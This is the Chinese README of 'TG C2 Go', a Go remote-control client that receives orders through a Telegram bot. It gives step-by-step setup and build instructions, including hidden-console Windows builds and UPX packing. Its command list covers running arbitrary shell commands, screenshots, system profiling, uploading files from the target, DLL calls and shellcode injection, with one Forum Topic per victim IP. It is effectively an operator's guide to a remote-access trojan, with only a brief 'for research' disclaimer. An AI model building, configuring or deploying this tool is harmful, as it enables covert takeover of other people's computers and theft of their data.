# TG C2 Go

这是一个通过 Telegram Bot API 进行远程控制的 C2 (Command & Control) 客户端，使用 Go 语言实现。

> **English**: [README.md](https://github.com/edakfcmaxzdjce/TG_c2_go/blob/main/README.md) | **中文文档**: README_zh.md

## 📋 项目概述

TG C2 Go 是一个轻量级、跨平台的 C2 客户端，通过 Telegram Bot API 实现远程控制和命令执行。

## 🚀 主要特性

- **Telegram Bot 集成**: 通过 Telegram Bot API 进行远程控制
- **文件管理**: 支持文件上传、下载和管理  
- **命令执行**: 远程执行系统命令
- **注入功能**: 支持 DLL 调用和 Shellcode 注入（Windows）
- **屏幕监控**: 实时屏幕截图功能
- **信息收集**: 系统信息、网络信息、已安装程序等
- **Topic 管理**: 智能 Topic 创建和复用
- **跨平台支持**: 支持 Windows、Linux、macOS（部分功能限制）

## 📦 项目结构

```
TG_c2_go/
├── config/           # 配置管理
│   └── api.go       # API 配置和 URL 管理
├── telegram/         # Telegram 客户端
│   └── client.go    # Bot API 封装
├── core/            # 核心功能
│   ├── topic.go     # Topic 管理
│   ├── file_manager.go  # 文件管理
│   └── command_loop.go  # 命令循环
├── commands/        # 命令处理
│   └── processor.go # 命令匹配和处理
├── functions/       # 功能模块
│   ├── info_collector.go   # 信息收集
│   ├── screen_capture.go   # 屏幕截图
│   ├── dll_runner.go      # DLL 调用
│   └── injector.go        # 代码注入
├── go.mod          # Go 依赖管理  
├── main.go         # 程序入口
└── README.md       # 项目文档
```

## 🛠️ 依赖库

- **github.com/shirou/gopsutil/v3** - 系统信息收集
- **github.com/kbinani/screenshot** - 屏幕截图
- **golang.org/x/sys** - 系统调用支持

## 🚀 快速开始

### 步骤 1: 创建 Telegram Bot

1. **打开 Telegram**，搜索并联系 [@BotFather](https://t.me/BotFather)

2. **创建新 Bot**：
   - 发送 `/newbot` 命令
   - 按照提示输入 Bot 的名称（例如：`My C2 Bot`）
   - 输入 Bot 的用户名（必须以 `bot` 结尾，例如：`my_c2_bot`）

3. **获取 Bot Token**：
   - BotFather 会返回一个 Token，格式类似：`1234567890:ABCdefGhiJklMnoPqrsTuvWxyz`
   - **重要**：保存好这个 Token，不要泄露给他人

4. **获取 Chat ID**：
   - 创建一个 Telegram 群组或频道（建议使用私有群组）
   - 将你的 Bot 添加到群组中
   - 发送一条消息到群组
   - 访问 `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - 在返回的 JSON 中找到 `chat` 对象，`id` 字段就是 Chat ID（例如：`-1002927089835`）

### 步骤 2: 配置客户端

编辑 `config/api.go` 文件，填写以下三项配置：

```go
BOT_TOKEN = "1234567890:ABCdefGhiJklMnoPqrsTuvWxyz"  // 从 BotFather 获取
CHAT_ID  = "-1002927012345"                          // 你的群组 Chat ID
BOT_NAME = "my_c2_bot"                               // Bot 用户名（不含@符号）
```

**就这么简单！** 所有 API URL 会自动从 `BOT_TOKEN` 生成，无需手动配置。

### 步骤 3: 编译程序

```bash
# 使用构建脚本（推荐）
./build.sh  # Linux/macOS
# 或
build.bat  # Windows

# 脚本会提示选择构建模式：
# 1) 正常版本 (Windows隐藏窗口)
# 2) Debug版本 (显示控制台)
```

### 步骤 4: 运行程序

```bash
# Linux/macOS
./build/TG_c2_go_linux_amd64
./build/TG_c2_go_darwin_arm64

# Windows
build\TG_c2_go_windows_amd64.exe
```

## 🔧 配置说明

### 方式 1：使用 Bot Token（推荐）

只需配置三项：

```go
BOT_TOKEN = "1234567890:ABCdefGhiJklMnoPqrsTuvWxyz"
CHAT_ID  = "-1002927089835"
BOT_NAME = "my_c2_bot"
```

所有 API URL 会自动生成，无需手动配置。

### 方式 2：手动配置 Base64 编码 URL（向后兼容）

如果你不想使用 Token 方式，也可以手动填写 Base64 编码的 URL：

```go
UPDATE_URL           = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMzQ1Njc4OTA6QUJDLi4uL2dldFVwZGF0ZXM="
SENDMSG_URL          = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMzQ1Njc4OTA6QUJDLi4uL3NlbmRNZXNzYWdl"
// ... 其他 URL
```

可以使用 `tools/config_generator.go` 工具生成这些 Base64 编码的 URL。

## 🚀 构建和运行

### 1. 安装依赖

```bash
go mod tidy
```

### 2. 配置 API

编辑 `config/api.go`，填写你的 Bot Token、Chat ID 和 Bot Name（详见上方"快速开始"部分）。

### 3. 编译程序

#### 使用构建脚本（推荐）

```bash
# Linux/macOS
./build.sh

# Windows
build.bat
```

构建脚本会提示选择构建模式：
- **正常版本**：Windows 隐藏控制台窗口，无黑窗口显示
- **Debug版本**：显示控制台窗口，可以看到所有输出和日志

构建脚本会自动使用以下优化标志来减小二进制大小：
- `-trimpath`: 移除文件路径信息
- `-ldflags="-s -w"`: 移除符号表和调试信息
- Windows 正常版本会额外添加 `-H windowsgui` 隐藏控制台

#### 手动编译

```bash
# 开发版本（不推荐，文件较大）
go build -o TG_c2_go

# 优化版本（推荐，减小约10-20%）
go build -trimpath -ldflags="-s -w" -o TG_c2_go

# Windows 交叉编译
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w" -o TG_c2_go.exe
```

#### 进一步减小大小（可选）

如果编译后的二进制仍然较大（>6MB），可以考虑：

1. **使用UPX压缩**（可能被杀毒软件误报）：
   ```bash
   # 安装UPX: https://upx.github.io/
   upx --best --lzma TG_c2_go
   # 可减小约50-70%，但启动时间可能增加
   ```

2. **移除未使用的依赖**：
   ```bash
   go mod tidy
   ```

3. **检查依赖大小**：
   ```bash
   go list -json -deps | jq -r '.Deps[] | select(.Standard == false) | .Path'
   ```

**注意**: 当前优化后的二进制大小通常在5-7MB左右，这是Go语言的正常大小范围。

### 4. 运行程序

```bash
./TG_c2_go        # Linux/macOS
TG_c2_go.exe      # Windows
```

## 📖 使用指南

### 首次运行

1. **确保 Bot 已添加到群组**：将你创建的 Bot 添加到指定的 Telegram 群组中

2. **启动客户端**：运行编译后的可执行文件

3. **自动初始化**：程序会自动：
   - 获取公网 IP 地址
   - 连接到 Telegram Bot API
   - 创建或复用 Forum Topic（以 IP 地址命名）
   - 开始监听命令

4. **验证连接**：程序会在 Topic 中发送一条连接消息（如果使用现有 Topic）

### 使用 Forum Topic（推荐）

- 程序会自动为每个客户端 IP 创建独立的 Forum Topic
- 同一 IP 重新连接时会复用现有的 Topic
- 可以在一个群组中管理多个客户端
- Topic 名称格式：`IP: xxx.xxx.xxx.xxx`

### 查看日志

- **Debug版本**：可以在控制台看到所有输出
- **正常版本**（Windows）：无控制台窗口，通过 Telegram 消息查看执行结果

## 📱 Telegram Bot 命令

### 基础命令

在 Telegram 群组的 Topic 中发送以下命令（`@your_bot` 部分可以省略，如果群组中只有一个 Bot）：

| 命令 | 说明 | 示例 |
|------|------|------|
| `/screen_shot@your_bot` | 获取目标主机屏幕截图 | `/screen_shot@my_c2_bot` |
| `/info_collect@your_bot` | 收集系统信息（CPU、内存、磁盘、网络等） | `/info_collect@my_c2_bot` |
| `/upload@your_bot <file_path>` | 上传指定路径的文件 | `/upload@my_c2_bot C:\Windows\System32\hosts` |
| `/set_sleep_time@your_bot <seconds>` | 设置命令轮询间隔（秒） | `/set_sleep_time@my_c2_bot 10` |
| `/setting_info@your_bot` | 显示当前配置信息 | `/setting_info@my_c2_bot` |
| `/disconnect@your_bot` | 断开连接并退出程序 | `/disconnect@my_c2_bot` |

### 执行系统命令

直接在 Topic 中发送任何文本消息（不是以 `/` 开头的命令），程序会自动作为系统命令执行：

- **Windows**: 使用 PowerShell 执行
- **macOS/Linux**: 使用 `sh -c` 执行

示例：
```
ls -la
whoami
netstat -an
```

### 高级功能（仅 Windows）

| 命令 | 说明 | 示例 |
|------|------|------|
| `/run_dll@your_bot <dll_name> <func_name>` | 调用 DLL 中的函数 | `/run_dll@my_c2_bot user32.dll MessageBoxA` |

### 文件处理

- **发送普通文件**：在 Topic 中发送文件，程序会自动下载到 `output_dir` 目录
- **Shellcode 注入**：发送文件时在 Caption（标题）中输入 `inject`，程序会执行 Shellcode 注入（仅 Windows）

### 使用技巧

1. **命令执行结果**：命令执行的结果会通过 Telegram 消息返回，如果输出较长会自动分块发送
2. **文件上传**：上传的文件会在 Topic 中以消息附件形式出现
3. **多客户端管理**：每个客户端都有独立的 Topic，可以同时管理多个目标
4. **Topic 复用**：相同 IP 地址的客户端会自动复用同一个 Topic

## 🔒 安全特性

1. **URL 混淆（可选）**: 支持 Base64 编码 URL 存储（向后兼容）
2. **Token 配置**: 推荐使用 Bot Token 自动生成 URL，简化配置
3. **线程安全**: 使用 mutex 保护全局状态
4. **错误处理**: 完善的错误处理和重试机制
5. **内存安全**: Go 的垃圾回收机制确保内存安全
6. **TLS 支持**: 支持自定义 TLS 配置

## ⚠️ 平台限制

- **DLL 调用**: 仅支持 Windows
- **Shellcode 注入**: 仅支持 Windows  
- **某些系统信息收集**: 跨平台支持，但 Windows 功能更完整

## ❓ 常见问题

### Q: 如何获取 Chat ID？

1. 将 Bot 添加到群组
2. 在群组中发送一条消息
3. 访问：`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. 在返回的 JSON 中找到 `"chat":{"id":-1001234567890}`，这个数字就是 Chat ID

### Q: 程序提示"未配置 BOT_TOKEN"怎么办？

确保在 `config/api.go` 中填写了 `BOT_TOKEN` 变量。如果使用旧版本的 Base64 URL 配置方式，确保至少填写了一个 URL。

### Q: Windows 版本没有窗口显示？

这是正常行为。正常版本（release）会隐藏控制台窗口。如果需要查看日志，请使用 Debug 版本构建。

### Q: 如何同时管理多个客户端？

每个客户端会根据其公网 IP 地址自动创建或复用独立的 Forum Topic。你可以在同一个群组中管理多个客户端，它们之间互不干扰。

### Q: Topic 创建失败怎么办？

检查以下事项：
1. Bot 是否有在群组中创建 Topic 的权限
2. 群组是否启用了 Forum 功能
3. Bot Token 是否正确
4. 网络连接是否正常

## 🔄 与 Rust 版本的差异

### 优势
- **更简单的部署**: 单一可执行文件，无需额外运行时
- **更好的跨平台支持**: Go 的标准库提供更好的跨平台兼容性
- **内存安全**: 垃圾回收机制，避免内存泄漏
- **更快的编译**: Go 编译速度更快

### 功能对等
- ✅ 所有核心 C2 功能
- ✅ Telegram Bot 集成
- ✅ 文件管理和注入
- ✅ 系统信息收集
- ✅ 命令执行
- ✅ 屏幕截图

## 🛡️ 免责声明

本项目仅供学习和研究使用，请遵守相关法律法规。使用者需要对自己的行为负责。

## 🤝 贡献

欢迎提交 Issue 和 Pull Request 来改进项目。

## 📄 许可证

本项目基于原始 Rust 版本，继承相同的许可证条款。

---

**原作者**: bamuwe  
**Go 版本移植**: Assistant  
**版本**: 1.0.0  
**最后更新**: 2025年10月31日

